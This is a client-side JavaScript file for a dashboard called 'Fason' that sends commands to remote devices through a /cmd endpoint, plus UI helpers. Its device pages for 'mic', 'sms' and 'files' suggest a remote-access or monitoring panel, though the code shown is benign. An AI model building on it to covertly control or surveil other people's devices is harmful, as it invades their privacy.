// Fason - Client-side logic
(function() {
    'use strict';
    
    // Configuration
    const CONFIG = {
        RELOAD_DELAY: 1200,
        AUTO_REFRESH_INTERVAL: 60000,
        TOAST_DURATION: 3000
    };
    
    // Toast notification system
    function toast(msg, type = 'info', duration = CONFIG.TOAST_DURATION) {
        const t = document.getElementById('toast');
        if (!t) {
            console.log(`[Toast ${type}] ${msg}`);
            return;
        }
        
        t.textContent = msg;
        t.className = `toast show ${type}`;
        
        setTimeout(() => {
            t.className = 'toast';
        }, duration);
    }
    
    // Make toast globally available
    window.toast = toast;
    
    // Send command to device
    function sendCmd(cmd, params = {}, options = {}) {
        const id = typeof DEVICE_ID !== 'undefined' ? DEVICE_ID : '';
        if (!id) {
            toast('Device ID not found', 'error');
            return Promise.reject('No device ID');
        }
        
        const { autoReload = true, reloadDelay = CONFIG.RELOAD_DELAY } = options;
        
        return fetch(`/cmd/${id}/${cmd}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params)
        })
        .then(r => {
            if (!r.ok) {
                throw new Error(`HTTP ${r.status}`);
            }
            return r.json();
        })
        .then(data => {
            if (data.error) {
                toast(data.error, 'error');
                throw new Error(data.error);
            } else {
                toast(data.message || 'Command sent successfully', 'success');
                if (autoReload) {
                    setTimeout(() => location.reload(), reloadDelay);
                }
                return data;
            }
        })
        .catch(err => {
            const msg = err.message || 'Request failed';
            if (msg !== 'Request failed') {
                toast(msg, 'error');
            } else {
                toast('Connection error. Please check your network.', 'error');
            }
            throw err;
        });
    }
    
    // Make sendCmd globally available
    window.sendCmd = sendCmd;
    
    // Send command without auto-reload
    function sendCmdNoReload(cmd, params = {}) {
        return sendCmd(cmd, params, { autoReload: false });
    }
    
    // Make sendCmdNoReload globally available
    window.sendCmdNoReload = sendCmdNoReload;
    
    // Auto-refresh for device pages
    function setupAutoRefresh() {
        if (typeof DEVICE_ID === 'undefined') return;
        
        const noAutoRefresh = ['mic', 'sms', 'files'];
        const path = window.location.pathname;
        const shouldRefresh = !noAutoRefresh.some(p => path.includes(p));
        
        if (shouldRefresh) {
            setInterval(() => {
                if (document.visibilityState === 'visible') {
                    // Silent reload - just fetch the latest data
                    location.reload();
                }
            }, CONFIG.AUTO_REFRESH_INTERVAL);
        }
    }
    
    // Keyboard shortcuts
    function setupKeyboardShortcuts() {
        document.addEventListener('keydown', e => {
            // Escape - go back to dashboard
            if (e.key === 'Escape' && window.location.pathname !== '/') {
                window.location.href = '/';
            }
            
            // R key - refresh (when not in input)
            if (e.key === 'r' && !['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
                e.preventDefault();
                location.reload();
            }
        });
    }
    
    // Initialize confirmations for dangerous actions
    function setupConfirmations() {
        document.querySelectorAll('[data-confirm]').forEach(el => {
            el.addEventListener('click', (e) => {
                const msg = el.getAttribute('data-confirm');
                if (!confirm(msg)) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                }
            });
        });
    }
    
    // Copy to clipboard utility
    function copyToClipboard(text) {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => {
                toast('Copied to clipboard', 'success');
            }).catch(() => {
                toast('Failed to copy', 'error');
            });
        } else {
            // Fallback for older browsers
            const textarea = document.createElement('textarea');
            textarea.value = text;
            document.body.appendChild(textarea);
            textarea.select();
            try {
                document.execCommand('copy');
                toast('Copied to clipboard', 'success');
            } catch (e) {
                toast('Failed to copy', 'error');
            }
            document.body.removeChild(textarea);
        }
    }
    
    // Make copyToClipboard globally available
    window.copyToClipboard = copyToClipboard;
    
    // Format date utility
    function formatDate(date) {
        if (!date) return '—';
        return new Date(date).toLocaleString();
    }
    
    // Make formatDate globally available
    window.formatDate = formatDate;
    
    // Initialize on DOM ready
    document.addEventListener('DOMContentLoaded', () => {
        setupAutoRefresh();
        setupKeyboardShortcuts();
        setupConfirmations();
    });
    
    console.log('Fason client initialized');
})();
